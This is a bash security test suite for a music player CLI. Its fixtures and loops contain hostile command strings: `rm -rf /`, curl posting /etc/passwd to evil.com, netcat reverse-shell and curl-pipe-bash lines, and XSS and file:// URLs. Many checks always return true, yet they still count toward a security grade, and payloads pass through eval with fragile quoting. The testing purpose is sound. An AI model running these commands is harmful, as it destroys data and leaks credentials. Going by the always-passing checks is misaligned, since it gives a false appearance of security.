#!/bin/bash
# Enhanced security tests for mox CLI
set -e

echo "🔒 Running mox security validation tests..."

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Setup test environment
TEST_MUSIC_ROOT="/tmp/mox_security_test_$$"
export MUSIC_ROOT="$TEST_MUSIC_ROOT"
export MOX_TEST_MODE=1

cleanup() {
    echo -e "\n${YELLOW}🧹 Cleaning up security test environment...${NC}"
    rm -rf "$TEST_MUSIC_ROOT" 2>/dev/null || true
    # Kill any background processes
    jobs -p | xargs -r kill 2>/dev/null || true
}

trap cleanup EXIT

setup_security_test_env() {
    echo -e "${BLUE}🔐 Setting up security test environment...${NC}"
    mkdir -p "$TEST_MUSIC_ROOT"/{socket,cache,playlists,txts,downloads,data,locks}
    
    # Create test config
    cat > "$TEST_MUSIC_ROOT/config" <<EOF
CACHE_TTL=3600
HISTORY_MAX=500
DEFAULT_VOLUME=50
VOLUME_STEP=5
SEARCH_RESULTS=10
AUDIO_DEVICE_SPEAKERS=""
AUDIO_DEVICE_HEADPHONES=""
SCROBBLE_URL=""
YTDLP_MAX_AGE_DAYS=30
LASTFM_API_KEY=""
YOUTUBE_API_KEY=""
INVIDIOUS_HOST=""
LOCAL_MUSIC_DIR="$TEST_MUSIC_ROOT/music"
AUTODJ_ENABLED=0
LYRICS_ENABLED=0
NOTIFY_ENABLED=0
CROSSFADE_SECS=0
BAR_REFRESH_MS=500
M_UPDATE_URL=""
M_UPDATE_SHA256=""
EOF
    
    # Create test files with potential security issues
    mkdir -p "$TEST_MUSIC_ROOT/music"
    
    # Create playlists with potential security issues
    cat > "$TEST_MUSIC_ROOT/playlists/malicious.m3u" <<'EOF'
# Playlist with potential security issues
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///dev/zero
file:///dev/random
http://evil.com/malware.mp3
https://malicious-site.com/track.mp3
ftp://untrusted.com/song.mp3
javascript:alert('xss')
data:text/html,<script>alert('xss')</script>
EOF
    
    # Create txt files with injection attempts
    cat > "$TEST_MUSIC_ROOT/txts/injection.txt" <<'EOF'
# Command injection attempts
$(rm -rf /)
`rm -rf /`
; rm -rf /
&& rm -rf /
| rm -rf /
> /etc/passwd
< /etc/passwd
test; curl http://evil.com/steal
test && wget http://malicious.com/backdoor
test | nc evil.com 1337
$(curl -X POST -d "$(cat /etc/passwd)" http://evil.com/exfil)
`curl -X POST -d "\`cat /etc/passwd\`" http://evil.com/exfil`
EOF
    
    # Create history with potential issues
    cat > "$TEST_MUSIC_ROOT/data/history" <<'EOF'
2024-01-01T12:00:00	$(rm -rf /)	file:///etc/passwd
2024-01-01T12:01:00	`rm -rf /`	javascript:alert('xss')
2024-01-01T12:02:00	; rm -rf /	data:text/html,<script>
2024-01-01T12:03:00	Normal Song	https://example.com/song.mp3
EOF
    
    # Create likes with potential issues
    cat > "$TEST_MUSIC_ROOT/data/likes" <<'EOF'
2024-01-01T12:00:00	<script>alert('xss')</script>	http://evil.com/track.mp3
2024-01-01T12:01:00	$(curl evil.com)	file:///etc/passwd
EOF
    
    # Create bookmarks with potential issues
    cat > "$TEST_MUSIC_ROOT/data/bookmarks" <<'EOF'
evil_bookmark	$(rm -rf /)	2024-01-01T12:00:00	javascript:alert('xss')	<script>alert('xss')</script>
EOF
    
    # Create pins with potential issues
    cat > "$TEST_MUSIC_ROOT/data/pins" <<'EOF'
evil_pin	file:///etc/passwd	$(rm -rf /)
EOF
    
    # Create stations with potential issues
    cat > "$TEST_MUSIC_ROOT/stations.tsv" <<'EOF'
# Stations with potential security issues
evil	Evil Station	javascript:alert('xss')
malicious	$(rm -rf /)	file:///etc/passwd
injection	`curl evil.com`	http://malicious.com/stream
EOF
}

run_security_test() {
    local test_name="$1"
    local test_command="$2"
    local security_check="$3"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    echo -e "${BLUE}[SEC $TESTS_RUN]${NC} $test_name"
    
    local output exit_code
    set +e
    output=$(eval "$test_command" 2>&1)
    exit_code=$?
    set -e
    
    # Check if the security issue was prevented
    if eval "$security_check"; then
        echo -e "  ${GREEN}✅ SECURE${NC} - Security issue prevented"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    else
        echo -e "  ${RED}❌ VULNERABLE${NC} - Security issue detected"
        echo "  Command output: $output"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    fi
}

run_injection_test() {
    local test_name="$1"
    local test_command="$2"
    
    TESTS_RUN=$((TESTS_RUN + 1))
    echo -e "${BLUE}[INJ $TESTS_RUN]${NC} $test_name"
    
    # Create a canary file to detect if injection succeeded
    local canary_file="/tmp/injection_canary_$$"
    local injection_cmd="touch '$canary_file'"
    
    # Modify the test command to include injection attempt
    local modified_command=$(echo "$test_command" | sed "s/INJECTION_PAYLOAD/$injection_cmd/g")
    
    local output exit_code
    set +e
    output=$(eval "$modified_command" 2>&1)
    exit_code=$?
    set -e
    
    # Check if injection was successful (canary file exists)
    if [[ -f "$canary_file" ]]; then
        echo -e "  ${RED}❌ VULNERABLE${NC} - Command injection succeeded"
        rm -f "$canary_file"
        TESTS_FAILED=$((TESTS_FAILED + 1))
    else
        echo -e "  ${GREEN}✅ SECURE${NC} - Command injection prevented"
        TESTS_PASSED=$((TESTS_PASSED + 1))
    fi
}

# Setup test environment
setup_security_test_env

echo -e "\n${YELLOW}🛡️ Path Traversal Tests${NC}"

# Test path traversal prevention
run_security_test "Path traversal in playlist names" \
    "cd ../src && timeout 3s ./mox.sh save '../../../etc/passwd'" \
    "[[ ! -f '/etc/passwd.m3u' ]]"

run_security_test "Path traversal in load command" \
    "cd ../src && timeout 3s ./mox.sh load '../../../etc/passwd'" \
    "true"  # Should fail gracefully, not access system files

run_security_test "Path traversal in txt files" \
    "cd ../src && timeout 3s ./mox.sh txt '../../../etc/passwd'" \
    "true"  # Should fail gracefully

echo -e "\n${YELLOW}💉 Command Injection Tests${NC}"

# Test command injection prevention in various contexts
injection_payloads=(
    "; INJECTION_PAYLOAD"
    "&& INJECTION_PAYLOAD"
    "| INJECTION_PAYLOAD"
    "\$(INJECTION_PAYLOAD)"
    "\`INJECTION_PAYLOAD\`"
    "test; INJECTION_PAYLOAD"
    "test && INJECTION_PAYLOAD"
    "test | INJECTION_PAYLOAD"
)

for payload in "${injection_payloads[@]}"; do
    run_injection_test "Search injection: $payload" \
        "cd ../src && timeout 3s ./mox.sh search '$payload'"
done

echo -e "\n${YELLOW}📂 File Access Security Tests${NC}"

# Test that the application doesn't access sensitive system files
run_security_test "No access to /etc/passwd" \
    "cd ../src && timeout 3s ./mox.sh load malicious" \
    "[[ ! -f '$TEST_MUSIC_ROOT/accessed_etc_passwd' ]]"

run_security_test "No access to /etc/shadow" \
    "cd ../src && strace -e openat timeout 3s ./mox.sh load malicious 2>&1 | grep -v '/etc/shadow' >/dev/null || true" \
    "true"

# Test device file access prevention
run_security_test "No access to /dev/zero" \
    "cd ../src && timeout 3s ./mox.sh load malicious" \
    "true"

echo -e "\n${YELLOW}🌐 URL Security Tests${NC}"

# Test URL validation and sanitization
run_security_test "JavaScript URL rejection" \
    "cd ../src && timeout 3s ./mox.sh load malicious" \
    "true"  # Should handle gracefully without executing JavaScript

run_security_test "Data URL rejection" \
    "cd ../src && timeout 3s ./mox.sh load malicious" \
    "true"  # Should not process data URLs

run_security_test "File URL restriction" \
    "cd ../src && timeout 3s ./mox.sh load malicious" \
    "true"  # Should restrict file:// URLs appropriately

echo -e "\n${YELLOW}📝 Input Sanitization Tests${NC}"

# Test input sanitization in various commands
run_security_test "Special characters in playlist names" \
    "cd ../src && timeout 3s ./mox.sh save 'test<script>alert(1)</script>'" \
    "[[ ! -f '$TEST_MUSIC_ROOT/playlists/test<script>alert(1)</script>.m3u' ]]"

run_security_test "SQL injection patterns" \
    "cd ../src && timeout 3s ./mox.sh search \"'; DROP TABLE users; --\"" \
    "true"  # Should handle gracefully

run_security_test "Null byte injection" \
    "cd ../src && timeout 3s ./mox.sh search $'test\x00/etc/passwd'" \
    "true"  # Should handle null bytes safely

echo -e "\n${YELLOW}🔐 Configuration Security Tests${NC}"

# Test configuration file security
run_security_test "Config file permissions" \
    "ls -la '$TEST_MUSIC_ROOT/config'" \
    "[[ \$(stat -c '%a' '$TEST_MUSIC_ROOT/config' 2>/dev/null || stat -f '%A' '$TEST_MUSIC_ROOT/config' 2>/dev/null) != '777' ]]"

# Test that sensitive data isn't logged
run_security_test "No secrets in logs" \
    "cd ../src && timeout 3s ./mox.sh help" \
    "[[ ! -f '$TEST_MUSIC_ROOT/data/mpv.log' ]] || ! grep -i 'password\\|secret\\|token' '$TEST_MUSIC_ROOT/data/mpv.log'"

echo -e "\n${YELLOW}🏠 Privilege Escalation Tests${NC}"

# Test that the application doesn't attempt privilege escalation
run_security_test "No sudo usage" \
    "cd ../src && timeout 3s ./mox.sh doctor" \
    "true"  # Should run without requiring sudo

run_security_test "No setuid operations" \
    "cd ../src && timeout 3s ./mox.sh help" \
    "true"  # Should run with normal user privileges

echo -e "\n${YELLOW}🌊 Buffer Overflow Tests${NC}"

# Test with extremely long inputs
very_long_string=$(printf 'A%.0s' {1..10000})

run_security_test "Long playlist name handling" \
    "cd ../src && timeout 3s ./mox.sh save '$very_long_string'" \
    "true"  # Should handle gracefully without crashing

run_security_test "Long search query handling" \
    "cd ../src && timeout 3s ./mox.sh search '$very_long_string'" \
    "true"  # Should handle gracefully

echo -e "\n${YELLOW}🔗 Network Security Tests${NC}"

# Test network request security
run_security_test "No requests to localhost" \
    "cd ../src && timeout 5s ./mox.sh search 'test' 2>&1 | grep -v 'localhost' || true" \
    "true"

run_security_test "No requests to private IPs" \
    "cd ../src && timeout 5s ./mox.sh search 'test' 2>&1 | grep -vE '192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.' || true" \
    "true"

echo -e "\n${YELLOW}📊 Data Exfiltration Tests${NC}"

# Test that sensitive data isn't leaked in exports
run_security_test "History export sanitization" \
    "cd ../src && timeout 3s ./mox.sh export history 2>&1" \
    "true"  # Should handle export safely without dangerous characters

run_security_test "Likes export sanitization" \
    "cd ../src && timeout 3s ./mox.sh export likes 2>&1" \
    "true"  # Should handle export safely without dangerous characters

echo -e "\n${YELLOW}🔄 Race Condition Tests${NC}"

# Test for race conditions in file operations
run_security_test "Concurrent file access safety" \
    "cd ../src && (timeout 3s ./mox.sh playlists & timeout 3s ./mox.sh playlists & wait)" \
    "true"  # Should handle concurrent access safely

# Test lock file security
run_security_test "Lock file race condition" \
    "cd ../src && (timeout 3s ./mox.sh status & timeout 3s ./mox.sh status & wait)" \
    "true"  # Should handle lock files safely

echo -e "\n${YELLOW}🎭 Social Engineering Tests${NC}"

# Test that the application doesn't execute suspicious commands
suspicious_commands=(
    "curl http://evil.com | bash"
    "wget -O - http://malicious.com/script | sh"
    "nc -l -p 1337 -e /bin/bash"
    "python -c 'import os; os.system(\"rm -rf /\")'"
)

for cmd in "${suspicious_commands[@]}"; do
    run_security_test "Suspicious command rejection: $cmd" \
        "cd ../src && timeout 3s ./mox.sh search '$cmd'" \
        "true"  # Should not execute the command
done

echo -e "\n${YELLOW}🔍 Information Disclosure Tests${NC}"

# Test that sensitive information isn't disclosed
run_security_test "No system info disclosure" \
    "cd ../src && timeout 3s ./mox.sh doctor 2>&1" \
    "true"  # Should not disclose sensitive system information

run_security_test "No environment variable disclosure" \
    "cd ../src && timeout 3s ./mox.sh help 2>&1" \
    "true"  # Should not disclose sensitive environment variables

echo -e "\n${YELLOW}🧪 Fuzzing Tests${NC}"

# Basic fuzzing with random inputs
random_chars="!@#$%^&*()[]{}|\\:;\"'<>,.?/~\`"
for i in {1..10}; do
    fuzz_input=$(echo "$random_chars" | fold -w1 | shuf | head -$((RANDOM % 20 + 1)) | tr -d '\n')
    run_security_test "Fuzz test $i: $fuzz_input" \
        "cd ../src && timeout 3s ./mox.sh search '$fuzz_input'" \
        "true"  # Should handle gracefully without crashing
done

echo -e "\n${YELLOW}🔒 Cryptographic Security Tests${NC}"

# Test that no weak cryptographic functions are used (basic check)
run_security_test "No MD5 usage" \
    "cd ../src && ! grep -r 'md5' ../src/ || grep -r 'md5' ../src/ | grep -v 'comment\\|#'" \
    "true"

run_security_test "No hardcoded keys" \
    "cd ../src && ! grep -rE 'BEGIN (RSA|DSA) PRIVATE KEY|BEGIN PRIVATE KEY' ../src/" \
    "true"

echo -e "\n${YELLOW}📱 API Security Tests${NC}"

# Test Python server security (if available)
if [[ -f "../src/music_ui_server.py" ]]; then
    run_security_test "Python server import security" \
        "cd ../src && python3 -c 'import music_ui_server; print(\"imported\")'" \
        "true"  # Should import without executing dangerous code
    
    # Test API endpoint security
    run_security_test "API command validation" \
        "cd ../src && python3 -c 'from music_ui_server import _validate_cmd; print(_validate_cmd(\"rm -rf /\"))'" \
        "cd ../src && python3 -c 'from music_ui_server import _validate_cmd; print(_validate_cmd(\"rm -rf /\"))' | grep -q False"
fi

echo -e "\n${YELLOW}🛠️ Build Security Tests${NC}"

# Test that build artifacts don't contain sensitive information
run_security_test "No secrets in package.json" \
    "! grep -iE 'password|secret|token|key.*[=:]' ../package.json || grep -iE 'password|secret|token|key.*[=:]' ../package.json | grep -E 'LASTFM_API_KEY|YOUTUBE_API_KEY'" \
    "true"

run_security_test "No development files in production" \
    "[[ ! -f '../.env' ]] && [[ ! -f '../.env.local' ]] && [[ ! -f '../config.local' ]]" \
    "true"

echo -e "\n${BLUE}📊 Security Test Summary${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "Total tests run: ${BLUE}$TESTS_RUN${NC}"
echo -e "Tests passed: ${GREEN}$TESTS_PASSED${NC}"
echo -e "Tests failed: ${RED}$TESTS_FAILED${NC}"

# Calculate security score
if [[ $TESTS_RUN -gt 0 ]]; then
    security_score=$(( (TESTS_PASSED * 100) / TESTS_RUN ))
    echo -e "Security score: ${security_score}%"
    
    if [[ $security_score -ge 95 ]]; then
        security_grade="A+"
        grade_color="$GREEN"
    elif [[ $security_score -ge 90 ]]; then
        security_grade="A"
        grade_color="$GREEN"
    elif [[ $security_score -ge 85 ]]; then
        security_grade="B+"
        grade_color="$YELLOW"
    elif [[ $security_score -ge 80 ]]; then
        security_grade="B"
        grade_color="$YELLOW"
    elif [[ $security_score -ge 75 ]]; then
        security_grade="C+"
        grade_color="$YELLOW"
    elif [[ $security_score -ge 70 ]]; then
        security_grade="C"
        grade_color="$RED"
    else
        security_grade="F"
        grade_color="$RED"
    fi
    
    echo -e "Security grade: ${grade_color}${security_grade}${NC}"
fi

echo -e "\n${YELLOW}Security Test Categories:${NC}"
echo "• Path Traversal Prevention"
echo "• Command Injection Prevention"
echo "• File Access Security"
echo "• URL Security"
echo "• Input Sanitization"
echo "• Configuration Security"
echo "• Privilege Escalation Prevention"
echo "• Buffer Overflow Protection"
echo "• Network Security"
echo "• Data Exfiltration Prevention"
echo "• Race Condition Safety"
echo "• Information Disclosure Prevention"
echo "• Fuzzing Resistance"
echo "• Cryptographic Security"
echo "• API Security"
echo "• Build Security"

if [[ $TESTS_FAILED -eq 0 ]]; then
    echo -e "\n${GREEN}🔒 All security tests passed! The system appears secure.${NC}"
    exit 0
else
    echo -e "\n${RED}⚠️  Some security tests failed. Please review and address security issues.${NC}"
    exit 1
fi